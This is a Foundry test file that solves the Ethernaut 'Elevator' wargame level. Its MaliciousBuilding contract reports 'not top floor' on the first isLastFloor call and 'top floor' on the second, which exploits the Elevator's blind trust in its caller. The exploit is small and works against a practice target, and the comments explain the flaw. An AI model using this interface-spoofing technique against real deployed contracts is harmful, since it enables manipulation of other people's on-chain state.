// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Elevator} from "src/levels/Elevator.sol";
import {ElevatorFactory} from "src/levels/ElevatorFactory.sol";
import {ElevatorAttack} from "src/attacks/ElevatorAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestElevatorSolution is Test, Utils {
    Ethernaut ethernaut;
    Elevator instance;
    MaliciousBuilding maliciousBuilding;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Elevator(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        maliciousBuilding = new MaliciousBuilding(address(instance));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the initial state of the level and environment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        // goal: make Elevator contract to return true on isLastFloor

        // goTo() function on Elevator might be expecting to be used by Building contract
        // however it's using any msg.sender as Building.
        // this means that we can create a malicious Building and control isLastFloor return
        vm.startPrank(player);

        console.log("floor: ",instance.floor());
        console.log("top: ",instance.top());

        //call malicious contract
        maliciousBuilding.attack();

        console.log("floor: ",instance.floor());
        console.log("top: ",instance.top());

        
        //assert that top returns true
        assert(instance.top());

    }
}
contract MaliciousBuilding {
    Elevator elevator;
    uint256 counter;
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    function attack() external {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        counter++;

        if (counter > 1) {
            return true;
        } else {
            return false;
        }
    }
}